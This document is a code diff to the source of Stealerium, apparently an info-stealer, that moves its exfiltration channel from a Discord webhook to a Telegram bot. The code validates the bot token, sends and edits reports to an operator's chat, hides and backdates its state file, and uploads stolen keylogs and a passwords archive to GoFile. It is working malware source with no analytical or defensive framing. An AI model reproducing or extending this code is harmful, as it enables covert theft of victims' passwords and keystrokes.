@@ -4,6 +4,7 @@ using System.IO;
 using System.Linq;
 using System.Net.Http;
 using System.Text.Json;
+using System.Text.RegularExpressions;
 using System.Threading.Tasks;
 using Newtonsoft.Json.Linq;
 using Stealerium.Helpers;
@@ -12,9 +13,11 @@ using Stealerium.Target.System;
 
 namespace Stealerium
 {
-    internal sealed class DiscordWebHook
+    internal sealed class Telegram
     {
         private const int MaxKeylogs = 10;
+
+        private static string TelegramBotAPI = "https://api.telegram.org/bot";
 
         // Message id location
         private static readonly string LatestMessageIdLocation = Path.Combine(Paths.InitWorkDir(), "msgid.dat");
@@ -23,11 +26,11 @@ namespace Stealerium
         private static readonly string KeylogsHistory = Path.Combine(Paths.InitWorkDir(), "history.dat");
 
         // Save latest message id to file
-        private static void SetLatestMessageId(string id)
+        private static void SetLatestMessageId(int id)
         {
             try
             {
-                File.WriteAllText(LatestMessageIdLocation, id);
+                File.WriteAllText(LatestMessageIdLocation, id.ToString());
                 Startup.SetFileCreationDate(LatestMessageIdLocation);
                 Startup.HideFile(LatestMessageIdLocation);
             }
@@ -38,109 +41,162 @@ namespace Stealerium
         }
 
         // Get latest message id from file
-        private static string GetLatestMessageId()
+        private static int GetLatestMessageId()
         {
-            return File.Exists(LatestMessageIdLocation) ? File.ReadAllText(LatestMessageIdLocation) : "-1";
+            if (!File.Exists(LatestMessageIdLocation))
+            {
+                return -1;
+            }
+
+            try
+            {
+                string fileContent = File.ReadAllText(LatestMessageIdLocation).Trim();
+                if (Int32.TryParse(fileContent, out int messageId))
+                {
+                    return messageId;
+                }
+            }
+            catch (IOException ex)
+            {
+                Logging.Log("IO error while reading the file:\n" + ex);
+            }
+            catch (Exception ex)
+            {
+                Logging.Log("Unexpected error:\n" + ex);
+            }
+
+            return -1;
         }
 
-        private static string GetMessageId(string response)
+        /// <summary>
+        /// Get sent message ID
+        /// </summary>
+        /// <param name="response">Telegram bot API response</param>
+        /// <returns>Message ID, or -1 if not found or an error occurs</returns>
+        private static int GetMessageId(string response)
         {
-            var jObject = JObject.Parse(response);
-            var id = jObject["id"].Value<string>();
-            return id;
+            Match match = Regex.Match(response, "\"result\":{\"message_id\":\\d+");
+            return Int32.Parse(match.Value.Replace("\"result\":{\"message_id\":", ""));
         }
 
-        public static async Task<bool> WebhookIsValidAsync()
+        /// <summary>
+        /// Check if the Telegram token is valid asynchronously
+        /// </summary>
+        /// <returns>Returns a Task<bool> indicating if the token is valid</returns>
+        public static async Task<bool> TokenIsValidAsync()
         {
             try
             {
-                using (var client = new HttpClient())
+                using (HttpClient client = new HttpClient())
                 {
-                    var response = await client.GetStringAsync(Config.Webhook).ConfigureAwait(false);
+                    // Build the full request URL
+                    string requestUrl = TelegramBotAPI + Config.TelegramAPI + "/getMe";
 
-                    using (JsonDocument doc = JsonDocument.Parse(response))
+                    // Send the request asynchronously
+                    HttpResponseMessage response = await client.GetAsync(requestUrl);
+
+                    // Ensure the response is successful
+                    if (response.IsSuccessStatusCode)
                     {
-                        if (doc.RootElement.TryGetProperty("type", out JsonElement typeElement))
-                        {
-                            return typeElement.GetInt32() == 1;
-                        }
+                        // Read the response content as a string
+                        string responseBody = await response.Content.ReadAsStringAsync();
+
+                        // Check if the response indicates the token is valid
+                        return responseBody.StartsWith("{\"ok\":true,");
                     }
                 }
             }
             catch (Exception error)
             {
-                Logging.Log("Discord >> Invalid Webhook:\n" + error);
+               Logging.Log("Telegram >> Invalid token:\n" + error);
             }
 
+            // Return false if there was an error or the token is invalid
             return false;
         }
 
         /// <summary>
-        ///     Send message to discord channel
+        /// Send message to Telegram bot asynchronously
         /// </summary>
         /// <param name="text">Message text</param>
-        private static async Task<string> SendMessageAsync(string text)
+        /// <returns>Returns a Task<int> indicating the message ID if successful, or 0 if failed</returns>
+        public static async Task<int> SendMessageAsync(string text)
         {
             try
             {
-                var discordValues = new Dictionary<string, string>
+                using (HttpClient client = new HttpClient())
                 {
-                    { "username", Config.Username },
-                    { "avatar_url", Config.Avatar },
-                    { "content", text }
-                };
+                    // Build the request URL
+                    string requestUrl = TelegramBotAPI + Config.TelegramAPI + "/sendMessage" +
+                                        "?chat_id=" + Config.TelegramID +
+                                        "&text=" + Uri.EscapeDataString(text) +  // Escape special characters in the text
+                                        "&parse_mode=Markdown" +
+                                        "&disable_web_page_preview=True";
 
-                using (var client = new HttpClient())
-                {
-                    var content = new FormUrlEncodedContent(discordValues);
-                    var response = await client.PostAsync(Config.Webhook + "?wait=true", content).ConfigureAwait(false);
-                    var responseString = await response.Content.ReadAsStringAsync().ConfigureAwait(false);
-                    return GetMessageId(responseString);
+                    // Send the GET request asynchronously
+                    HttpResponseMessage response = await client.GetAsync(requestUrl);
+
+                    // Ensure the response is successful
+                    if (response.IsSuccessStatusCode)
+                    {
+                        // Read the response content as a string
+                        string responseBody = await response.Content.ReadAsStringAsync();
+
+                        // Extract the message ID from the response
+                        return GetMessageId(responseBody);
+                    }
                 }
             }
             catch (Exception error)
             {
-                Logging.Log("Discord >> SendMessage exception:\n" + error);
+                // Log any exceptions that occur during the request
+                Logging.Log("Telegram >> SendMessage exception:\n" + error);
             }
 
-            return "0";
+            // Return 0 if there was an error or the request failed
+            return 0;
         }
 
+
         /// <summary>
-        ///     Edit message text in discord channel
+        /// Edit message text in Telegram bot asynchronously
         /// </summary>
-        /// <param name="text">New text</param>
+        /// <param name="text">New message text</param>
         /// <param name="id">Message ID</param>
-        private static async Task EditMessageAsync(string text, string id)
+        /// <returns>A Task representing the asynchronous operation</returns>
+        public static async Task EditMessageAsync(string text, int id)
         {
             try
             {
-                var discordValues = new Dictionary<string, string>
+                using (HttpClient client = new HttpClient())
                 {
-                    { "username", Config.Username },
-                    { "avatar_url", Config.Avatar },
-                    { "content", text }
-                };
+                    // Build the request URL
+                    string requestUrl = TelegramBotAPI + Config.TelegramAPI + "/editMessageText" +
+                                        "?chat_id=" + Config.TelegramID +
+                                        "&text=" + Uri.EscapeDataString(text) +  // Escape special characters in the text
+                                        "&message_id=" + id +
+                                        "&parse_mode=Markdown" +
+                                        "&disable_web_page_preview=True";
 
-                using (var client = new HttpClient())
-                {
-                    var content = new FormUrlEncodedContent(discordValues);
-                    var request = new HttpRequestMessage(new HttpMethod("PATCH"), Config.Webhook + "/messages/" + id)
+                    // Send the GET request asynchronously
+                    HttpResponseMessage response = await client.GetAsync(requestUrl);
+
+                    // Ensure the response is successful
+                    if (!response.IsSuccessStatusCode)
                     {
-                        Content = content
-                    };
-                    await client.SendAsync(request).ConfigureAwait(false);
+                        Logging.Log("Telegram >> EditMessage failed with status code: " + response.StatusCode);
+                    }
                 }
             }
-            catch
+            catch (Exception error)
             {
-                // ignored
+                // Log any exceptions that occur during the request
+                Logging.Log("Telegram >> EditMessage exception:\n" + error);
             }
         }
 
-
         /// <summary>
-        ///     Upload keylogs to anonfile
+        ///     Upload keylogs to GoFile
         /// </summary>
         private static void UploadKeylogs()
         {
@@ -262,8 +318,8 @@ namespace Stealerium
                        + "\n🔐 Archive password is: \"" + StringsCrypt.ArchivePassword + "\""
                        + "```";
 
-            var last = GetLatestMessageId();
-            if (last != "-1")
+            int last = GetLatestMessageId();
+            if (last != -1)
                 await EditMessageAsync(info, last).ConfigureAwait(false);
             else
                 SetLatestMessageId(await SendMessageAsync(info).ConfigureAwait(false));
@@ -273,9 +329,9 @@ namespace Stealerium
         {
             Logging.Log("Sending passwords archive to Gofile");
             var url = GofileFileService.UploadFileAsync(file);
-            Logging.Log("Sending report to discord");
+            Logging.Log("Sending report to Telegram");
             await SendSystemInfoAsync(await url.ConfigureAwait(false)).ConfigureAwait(false);
-            Logging.Log("Report sent to discord");
+            Logging.Log("Report sent to Telegram");
             File.Delete(file);
         }
     }
